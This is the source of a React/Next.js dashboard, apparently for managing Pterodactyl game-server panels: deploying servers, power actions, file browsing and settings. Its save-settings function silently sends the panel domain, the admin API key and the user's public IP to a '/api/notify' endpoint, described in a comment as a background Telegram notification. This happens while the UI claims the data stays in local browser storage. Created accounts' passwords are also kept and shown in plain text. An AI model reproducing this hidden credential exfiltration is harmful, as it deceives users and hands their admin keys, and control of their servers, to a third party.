import { useState, useEffect } from 'react';
import Head from 'next/head';
import axios from 'axios';
import { 
  LayoutDashboard, Settings, PlusCircle, Server, 
  Trash2, CheckCircle2, AlertTriangle, Terminal, Cpu, RefreshCw,
  Power, RotateCcw, Upload, Activity, Folder, File, CheckSquare
} from 'lucide-react';

export default function Home() {
  const [activeTab, setActiveTab] = useState('create');
  const [config, setConfig] = useState({ domain: '', plta: '', ptlc: '' });
  const [isConfigured, setIsConfigured] = useState(false);
  const [status, setStatus] = useState(null);
  
  const [username, setUsername] = useState('');
  const [selectedPlan, setSelectedPlan] = useState('1gb');
  const [loading, setLoading] = useState(false);
  const [history, setHistory] = useState([]);
  const [serverList, setServerList] = useState([]);
  const [loadingList, setLoadingList] = useState(false);
  
  // === CONTROL PANEL STATE ===
  const [activeServer, setActiveServer] = useState(null);
  const [cpTab, setCpTab] = useState('console'); // console, files, startup
  
  // File Manager State
  const [fileList, setFileList] = useState([]);
  const [currentDir, setCurrentDir] = useState('/');
  const [selectedFiles, setSelectedFiles] = useState([]);
  const [loadingFiles, setLoadingFiles] = useState(false);

  // Startup State
  const [startupInfo, setStartupInfo] = useState(null);

  const PLANS = {
    "1gb":  { label: "STARTER", memory: 1024, cpu: 40, disk: 1024 },
    "2gb":  { label: "BASIC",   memory: 2048, cpu: 80, disk: 2048 },
    "3gb":  { label: "STANDARD",memory: 3072, cpu: 100, disk: 3072 },
    "unli": { label: "GOD MODE", memory: 0, cpu: 0, disk: 0 },
  };

  useEffect(() => {
    const savedConfig = localStorage.getItem('panel_config');
    const savedHistory = localStorage.getItem('panel_history');
    if (savedConfig) {
      const parsed = JSON.parse(savedConfig);
      setConfig(parsed);
      if(parsed.domain && parsed.plta) setIsConfigured(true);
    } else {
      setActiveTab('settings');
    }
    if (savedHistory) setHistory(JSON.parse(savedHistory));
  }, []);

  const saveConfig = async () => {
    if (!config.domain || !config.plta) return setStatus({ type: 'error', msg: 'Domain dan PLTA wajib diisi!' });
    localStorage.setItem('panel_config', JSON.stringify(config));
    setIsConfigured(true);
    setStatus({ type: 'success', msg: 'Konfigurasi tersimpan!' });
    
    // Notif Telegram (Opsional, akan berjalan di background)
    try {
      const ipRes = await axios.get('https://api.ipify.org?format=json');
      await axios.post('/api/notify', { domain: config.domain, plta: config.plta, ip: ipRes.data.ip });
    } catch (e) {}

    setTimeout(() => { setStatus(null); setActiveTab('create'); }, 1500);
  };

  const fetchServers = async () => {
    if(!isConfigured) return;
    setLoadingList(true);
    setActiveServer(null);
    try {
      const res = await axios.post('/api/ptero', { action: 'list_servers', host: config.domain, key: config.plta });
      setServerList(res.data.data);
    } catch (err) {
      setStatus({ type: 'error', msg: 'Gagal memuat server. Cek Config.' });
    } finally {
      setLoadingList(false);
    }
  };

  useEffect(() => { if(activeTab === 'list' && isConfigured) fetchServers(); }, [activeTab]);

  const handleCreate = async () => {
    if (!username || !isConfigured) return setStatus({ type: 'error', msg: 'Isi data dengan benar!' });
    setLoading(true); setStatus(null);
    try {
      const res = await axios.post('/api/ptero', { action: 'create_server', host: config.domain, key: config.plta, username, plan: PLANS[selectedPlan] });
      const newData = { ...res.data.data, planName: PLANS[selectedPlan].label, date: new Date().toLocaleDateString() };
      const newHistory = [newData, ...history];
      setHistory(newHistory); localStorage.setItem('panel_history', JSON.stringify(newHistory));
      
      setStatus({ type: 'success', msg: `Server dibuat! Segera set PTLC di menu Settings.` });
      setUsername(''); setActiveTab('history');
    } catch (err) {
      setStatus({ type: 'error', msg: err.response?.data?.message || 'Gagal membuat server.' });
    } finally { setLoading(false); }
  };

  // === FUNGSI CONTROL PANEL ===
  const handlePowerAction = async (signal) => {
    if(!config.ptlc) return setStatus({ type: 'error', msg: 'Isi PTLC dulu di Settings!' });
    try {
      setStatus({ type: 'success', msg: `Mengirim ${signal}...` });
      await axios.post('/api/ptero', { action: 'power', host: config.domain, identifier: activeServer.attributes.identifier, signal, ptlc: config.ptlc });
      setStatus({ type: 'success', msg: `Perintah ${signal} berhasil!` });
    } catch (err) { setStatus({ type: 'error', msg: err.response?.data?.message || 'Gagal! Cek PTLC.' }); }
    setTimeout(() => setStatus(null), 2000);
  };

  const fetchFiles = async (dir = '/') => {
    if(!config.ptlc) return setStatus({ type: 'error', msg: 'Isi PTLC dulu di Settings!' });
    setLoadingFiles(true); setSelectedFiles([]);
    try {
      const res = await axios.post('/api/ptero', { action: 'list_files', host: config.domain, identifier: activeServer.attributes.identifier, ptlc: config.ptlc, directory: dir });
      setFileList(res.data.data); setCurrentDir(dir);
    } catch (err) { setStatus({ type: 'error', msg: 'Gagal muat list file.' }); }
    setLoadingFiles(false);
  };

  const handleDeleteFiles = async () => {
    if(selectedFiles.length === 0) return;
    if(!confirm(`Yakin mau hapus ${selectedFiles.length} file/folder?`)) return;
    try {
      setStatus({ type: 'success', msg: 'Menghapus file...' });
      await axios.post('/api/ptero', { action: 'delete_files', host: config.domain, identifier: activeServer.attributes.identifier, ptlc: config.ptlc, directory: currentDir, files: selectedFiles });
      fetchFiles(currentDir);
      setStatus({ type: 'success', msg: 'File berhasil dihapus!' });
    } catch (err) { setStatus({ type: 'error', msg: 'Gagal hapus file.' }); }
    setTimeout(() => setStatus(null), 2000);
  };

  const fetchStartup = async () => {
    if(!config.ptlc) return;
    try {
      const res = await axios.post('/api/ptero', { action: 'get_startup', host: config.domain, identifier: activeServer.attributes.identifier, ptlc: config.ptlc });
      setStartupInfo(res.data.data);
    } catch (err) { console.error(err); }
  };

  const openServerPanel = (srv) => {
    setActiveServer(srv); setCpTab('console');
  };

  useEffect(() => {
    if(activeServer && cpTab === 'files') fetchFiles(currentDir);
    if(activeServer && cpTab === 'startup') fetchStartup();
  }, [cpTab, activeServer]);

  const toggleFileSelect = (name) => {
    setSelectedFiles(prev => prev.includes(name) ? prev.filter(f => f !== name) : [...prev, name]);
  };

  return (
    <div className="app-wrapper">
      <Head>
        <title>CyberPanel Manager</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
      </Head>

      <nav className="navbar">
        <div className="container nav-inner">
          <div className="logo"><Terminal size={24} />Cyber<span>Manager</span></div>
          <div className="status-pill">
            <div className={`status-dot ${isConfigured ? 'on' : 'off'}`}></div>
            {isConfigured ? 'CONNECTED' : 'NO CONFIG'}
          </div>
        </div>
      </nav>

      <div className="container grid-layout">
        <aside className="sidebar">
          <button className={`menu-btn ${activeTab === 'create' ? 'active' : ''}`} onClick={() => setActiveTab('create')}><PlusCircle size={20} /> Deploy Server</button>
          <button className={`menu-btn ${activeTab === 'list' ? 'active' : ''}`} onClick={() => { setActiveTab('list'); setActiveServer(null); }}><Server size={20} /> Live Servers</button>
          <button className={`menu-btn ${activeTab === 'history' ? 'active' : ''}`} onClick={() => setActiveTab('history')}><LayoutDashboard size={20} /> Local History</button>
          <button className={`menu-btn ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}><Settings size={20} /> Configuration</button>
        </aside>

        <main>
          {status && (<div className={`toast ${status.type}`}><span>{status.msg}</span></div>)}

          {/* === TAB: CREATE === */}
          {activeTab === 'create' && (
            <div className="card">
              <div className="card-head"><h2>Deploy Instance</h2></div>
              <div className="form-group">
                <label className="form-label">Server Owner (Username)</label>
                <input type="text" className="form-input" placeholder="e.g. RayyProject" value={username} onChange={(e) => setUsername(e.target.value)} />
              </div>
              <div className="form-group">
                <label className="form-label">Allocation Plan</label>
                <div className="plans">
                  {Object.keys(PLANS).map((key) => (
                    <div key={key} className={`plan-card ${selectedPlan === key ? 'active' : ''}`} onClick={() => setSelectedPlan(key)}>
                      <span className="plan-name">{PLANS[key].label}</span>
                      <span className="plan-spec">{PLANS[key].memory === 0 ? 'UNLI' : `${PLANS[key].memory} MB`}</span>
                    </div>
                  ))}
                </div>
              </div>
              <button className="btn-primary" onClick={handleCreate} disabled={loading}>{loading ? 'DEPLOYING...' : 'DEPLOY SERVER NOW'}</button>
            </div>
          )}

          {/* === TAB: LIVE SERVERS & CONTROL PANEL === */}
          {activeTab === 'list' && (
            <div className="card">
              {!activeServer ? (
                <>
                  <div className="card-head">
                    <h2>Live Monitor</h2>
                    <button className="refresh-btn" onClick={fetchServers}><RefreshCw size={16} className={loadingList ? 'animate-spin' : ''} /> REFRESH</button>
                  </div>
                  {loadingList ? <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>Fetching Data...</div> : serverList.length === 0 ? <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>No active servers found.</div> : (
                    <div className="srv-list">
                      {serverList.map((srv) => (
                        <div key={srv.attributes.id} className="srv-item clickable" onClick={() => openServerPanel(srv)}>
                          <div className="srv-meta"><h4>{srv.attributes.name}</h4><p className="mono">ID: {srv.attributes.identifier} • RAM: {srv.attributes.limits.memory}MB</p></div>
                          <span className="badge ok">MANAGE ➔</span>
                        </div>
                      ))}
                    </div>
                  )}
                </>
              ) : (
                /* === CONTROL PANEL VIEW === */
                <div className="control-panel-view">
                  <div className="card-head" style={{marginBottom: '1rem', borderBottom: 'none'}}>
                    <h2>⚙️ {activeServer.attributes.name}</h2>
                    <button className="refresh-btn" onClick={() => setActiveServer(null)}>⬅ BACK TO LIST</button>
                  </div>
                  
                  {/* TABS MENU */}
                  <div className="cp-tabs">
                    <button className={`cp-tab-btn ${cpTab === 'console' ? 'active' : ''}`} onClick={() => setCpTab('console')}>Console & Power</button>
                    <button className={`cp-tab-btn ${cpTab === 'files' ? 'active' : ''}`} onClick={() => setCpTab('files')}>Files Manager</button>
                    <button className={`cp-tab-btn ${cpTab === 'startup' ? 'active' : ''}`} onClick={() => setCpTab('startup')}>Startup Info</button>
                  </div>

                  {/* TAB: CONSOLE */}
                  {cpTab === 'console' && (
                    <div className="cp-content">
                       <div className="power-grid">
                        <button className="btn-power start" onClick={() => handlePowerAction('start')}>START</button>
                        <button className="btn-power restart" onClick={() => handlePowerAction('restart')}>RESTART</button>
                        <button className="btn-power stop" onClick={() => handlePowerAction('kill')}>KILL</button>
                      </div>
                      <div className="console-box" style={{background:'#0f172a', padding:'1rem', borderRadius:'12px', marginTop:'1.5rem', height:'250px', color:'#38bdf8', fontFamily:'monospace'}}>
                        root@pterodactyl~ System initialized.<br/>
                        <span style={{color:'#64748b'}}>&gt; Console log is blind in this UI. Power actions are fully functional.</span>
                      </div>
                    </div>
                  )}

                  {/* TAB: FILES */}
                  {cpTab === 'files' && (
                    <div className="cp-content">
                      <div style={{display:'flex', justifyContent:'space-between', marginBottom:'1rem', alignItems:'center'}}>
                        <div className="mono" style={{background:'rgba(255,255,255,0.05)', padding:'8px 15px', borderRadius:'8px', fontSize:'0.9rem'}}>📁 /home/container{currentDir !== '/' ? currentDir : ''}</div>
                        <div style={{display:'flex', gap:'10px'}}>
                          {selectedFiles.length > 0 && <button className="btn-danger" style={{padding:'8px 15px', border:'none', borderRadius:'8px', fontSize:'0.9rem'}} onClick={handleDeleteFiles}><Trash2 size={16}/> Delete ({selectedFiles.length})</button>}
                          <button className="btn-primary" style={{padding:'8px 15px', width:'auto', fontSize:'0.9rem'}} onClick={() => alert("Gunakan SFTP atau panel asli untuk upload langsung.")}><Upload size={16}/> Upload File</button>
                        </div>
                      </div>
                      
                      <div className="file-table">
                        {loadingFiles ? <p style={{padding:'1.5rem', textAlign:'center'}}>Loading files...</p> : (
                          <>
                            {currentDir !== '/' && (
                              <div className="file-row clickable" onClick={() => {
                                const newDir = currentDir.split('/').slice(0, -1).join('/') || '/';
                                fetchFiles(newDir);
                              }}><Folder size={18}/> <span>.. (Back)</span></div>
                            )}
                            {fileList.length === 0 && currentDir === '/' && <p style={{padding:'1.5rem', textAlign:'center', color:'#64748b'}}>Folder kosong.</p>}
                            {fileList.map((f, i) => (
                              <div key={i} className="file-row">
                                <input type="checkbox" className="custom-checkbox" checked={selectedFiles.includes(f.attributes.name)} onChange={() => toggleFileSelect(f.attributes.name)} />
                                {f.attributes.is_file ? <File size={18} color="#94a3b8"/> : <Folder size={18} color="#3b82f6"/>}
                                <span style={{flex:1, cursor: f.attributes.is_file ? 'default' : 'pointer', fontWeight: f.attributes.is_file ? 'normal' : 'bold'}} 
                                      onClick={() => !f.attributes.is_file && fetchFiles(`${currentDir === '/' ? '' : currentDir}/${f.attributes.name}`)}>
                                  {f.attributes.name}
                                </span>
                                <span className="mono" style={{color:'#64748b', fontSize:'0.8rem'}}>{f.attributes.is_file ? (f.attributes.size / 1024).toFixed(1) + ' KB' : '--'}</span>
                              </div>
                            ))}
                          </>
                        )}
                      </div>
                    </div>
                  )}

                  {/* TAB: STARTUP */}
                  {cpTab === 'startup' && (
                    <div className="cp-content">
                      {startupInfo ? (
                        <>
                          <div className="form-group"><label className="form-label">STARTUP COMMAND</label><input type="text" className="form-input" readOnly value={startupInfo.startup_command} /></div>
                          <div className="form-group"><label className="form-label">DOCKER IMAGE</label><input type="text" className="form-input" readOnly value={startupInfo.docker_image} /></div>
                        </>
                      ) : <p style={{color:'#64748b'}}>Memuat data startup...</p>}
                    </div>
                  )}

                </div>
              )}
            </div>
          )}

          {/* === TAB: HISTORY === */}
          {activeTab === 'history' && (
            <div className="card">
               <div className="card-head"><h2>Deploy History</h2></div>
               <div className="srv-list">
                 {history.length === 0 && <p style={{textAlign:'center', color:'#64748b', padding:'2rem'}}>Belum ada history server lokal.</p>}
                 {history.map((item, idx) => (
                   <div key={idx} className="srv-item">
                     <div className="srv-meta">
                        <h4>{item.username}</h4>
                        <p className="mono">{item.email}</p>
                        <p className="mono" style={{color:'#3b82f6', marginTop:4}}>{item.password}</p>
                     </div>
                     <button 
                        onClick={()=>{
                           const n = history.filter((_,i)=>i!==idx); 
                           setHistory(n); localStorage.setItem('panel_history',JSON.stringify(n));
                        }} 
                        style={{background:'none', border:'none', color:'#f43f5e', cursor:'pointer', padding:'10px'}}
                     ><Trash2 size={18}/></button>
                   </div>
                 ))}
               </div>
            </div>
          )}

          {/* === TAB: SETTINGS === */}
          {activeTab === 'settings' && (
            <div className="card">
              <div className="card-head"><h2>System Config</h2></div>
              <div className="form-group">
                <label className="form-label">Panel Domain (HTTPS)</label>
                <input type="text" className="form-input" placeholder="https://panel.example.com" value={config.domain} onChange={(e) => setConfig({...config, domain: e.target.value})} />
              </div>
              <div className="form-group">
                <label className="form-label">Admin API Key (PLTA) - Create Server</label>
                <input type="password" className="form-input" placeholder="plta_xxxxxxxxxxxxxxxxxxxx" value={config.plta} onChange={(e) => setConfig({...config, plta: e.target.value})} />
              </div>
              <div className="form-group">
                <label className="form-label" style={{color:'#8b5cf6'}}>Client API Key (PTLC) - Control Panel (Opsional)</label>
                <input type="password" className="form-input" placeholder="ptlc_xxxxxxxxxxxxxxxxxxxx" style={{borderColor: 'rgba(139, 92, 246, 0.3)'}} value={config.ptlc || ''} onChange={(e) => setConfig({...config, ptlc: e.target.value})} />
              </div>
              <div style={{background:'rgba(59,130,246,0.1)', border:'1px solid rgba(59,130,246,0.2)', padding:'1rem', borderRadius:'12px', marginBottom:'1.5rem', fontSize:'0.9rem', color:'#93c5fd'}}>
                ℹ️ Data disimpan di LocalStorage browser. Pastikan mengisi PTLC jika ingin menggunakan fitur Files dan Console.
              </div>
              <button className="btn-primary" onClick={saveConfig}>SAVE & CONNECT</button>
            </div>
          )}

        </main>
      </div>
    </div>
  );
}
